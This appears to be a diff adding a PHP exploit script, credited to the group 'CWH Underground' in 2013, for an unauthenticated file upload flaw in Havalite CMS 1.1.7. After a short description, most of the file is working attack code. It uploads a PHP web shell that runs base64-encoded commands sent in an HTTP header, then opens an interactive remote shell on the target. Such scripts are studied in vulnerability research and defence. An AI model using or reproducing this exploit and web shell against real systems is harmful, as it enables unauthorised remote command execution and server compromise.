@@ -1,0 +1,105 @@
+<?php
+ 
+/*
+ 
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /        
+  / XXXXXX /
+ (________(          
+  `------'
+  
+ Exploit Title   : Havalite CMS Unrestricted File Upload Exploit
+ Date            : 16 June 2013
+ Exploit Author  : CWH Underground
+ Site            : www.2600.in.th
+ Vendor Homepage : http://havalite.com/
+ Software Link   : http://jaist.dl.sourceforge.net/project/havalite/havalite_1.1.7.zip
+ Version         : 1.1.7
+ Tested on       : Window and Linux
+  
+  
+#####################################################
+VULNERABILITY: Unrestricted File Upload 
+#####################################################
+  
+/havalite/upload.php 
+ 
+#####################################################
+DESCRIPTION
+#####################################################
+  
+Restricted access to this script isn't properly realized (Don't require authentication) ,  
+so an attacker might be able to upload arbitrary files containing malicious PHP code due to uploaded file 
+extension isn't properly checked.
+ 
+
+#####################################################
+EXPLOIT
+#####################################################
+  
+*/
+ 
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+  
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print "\n+-----------------------------------------------+";
+print "\n| Havalite CMS Unrestricted File Upload Exploit |";
+print "\n+-----------------------------------------------+\n";
+  
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /havalite/\n";
+    die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+ 
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"files[]\"; filename=\"sh.php\"\r\n";
+$payload .= "Content-Type: application/octet-stream\r\n\r\n";
+$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet  = "POST {$path}havalite/upload.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Referee: {$host}{$path}havalite/hava_upload.php\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+     
+http_send($host, $packet);
+ 
+$packet  = "GET {$path}/havalite/tmp/files/sh.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+     
+while(1)
+{
+    print "\nHavalite-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+ 
+?>
